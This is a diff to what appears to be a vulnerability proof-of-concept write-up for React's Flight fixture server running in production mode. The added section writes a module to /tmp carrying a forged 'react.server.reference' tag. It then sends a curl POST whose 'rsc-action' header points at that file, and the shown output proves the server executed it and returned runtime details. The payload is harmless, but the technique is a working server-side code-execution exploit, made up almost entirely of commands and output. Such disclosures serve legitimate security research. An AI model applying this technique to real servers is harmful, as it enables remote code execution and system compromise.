@@ -110,12 +110,42 @@ EOF
 Run the /react/fixtures/flight as production:
 
 ```bash
-┌──(keshav㉿kali)-[~/Downloads/react/fixtures/flight]
-└─$ NODE_ENV=production /home/keshav/.nvm/versions/node/v20.20.0/bin/yarn start
+[keshavgoyal@hazelnut flight]$ NODE_ENV=production yarn start
+```
+
+Payload:
+```bash
+cat > /tmp/rsc_poc.mjs <<'EOF'
+export function pwn() {
+  const proof = {
+    env: process.env.NODE_ENV,
+    // shows it’s running on the server-side Node runtime
+    node: process.version,
+    pid: process.pid,
+    // often includes --experimental-loader in this fixture
+    execArgv: process.execArgv,
+    window: typeof window,
+  };
+
+  return "PROD_PROOF " + JSON.stringify(proof);
+}
+
+// Satisfy the server's check in fixtures/flight/server/region.js:215
+pwn.$$typeof = Symbol.for("react.server.reference");
+EOF
+
+
 ```
 
 
+Output:
 
-
-
+```bash
+[keshavgoyal@hazelnut flight]$ curl -sS 'http://localhost:3000/' \
+  -X POST \
+  -H 'Accept: text/x-component' \
+  -H 'Content-Type: text/plain' \
+  -H "rsc-action: file:///tmp/rsc_poc.mjs?v=$(date +%s%N)#pwn" \
+  --data '[]' | strings | grep -F 'PROD_PROOF'
+0:{"root":[[["$","link","static/css/main.559bb6db.css",{"rel":"stylesheet","href":"static/css/main.559bb6db.css","precedence":"default"}]],"$L1"],"returnValue":"PROD_PROOF {\"env\":\"production\",\"node\":\"v24.13.0\",\"pid\":8464,\"execArgv\":[\"--experimental-loader\",\"./loader/region.js\",\"--conditions=react-server\"],\"window\":\"undefined\"}","formState":null}
 ```
